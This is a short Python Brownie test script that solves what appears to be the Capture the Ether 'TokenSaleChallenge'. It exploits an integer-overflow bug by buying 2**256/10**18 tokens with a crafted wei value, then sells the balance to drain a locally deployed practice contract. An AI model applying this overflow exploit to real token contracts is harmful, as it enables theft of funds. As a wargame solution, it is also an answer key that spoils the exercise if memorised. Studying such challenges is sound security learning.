from lib2to3.pgen2 import token
from brownie import TokenSaleChallenge, accounts
from eth_utils import to_bytes
from scripts.helpful_scripts import *
from web3 import Web3, eth

amount = Web3.toWei(1, "ether")

"""
1 ether = 10^18
Solidity 
"""


def test_tokensale():
    tokensale = TokenSaleChallenge.deploy(
        accounts[1], {"from": accounts[0], "value": amount}
    )
    tokensale.buy(
        (2 ** 256 / 10 ** 18), {"from": accounts[1], "value": 415992086870360064}
    )
    balance = tokensale.balanceOf(accounts[1])
    tokensale.sell(balance)
    assert tokensale.isComplete() == True
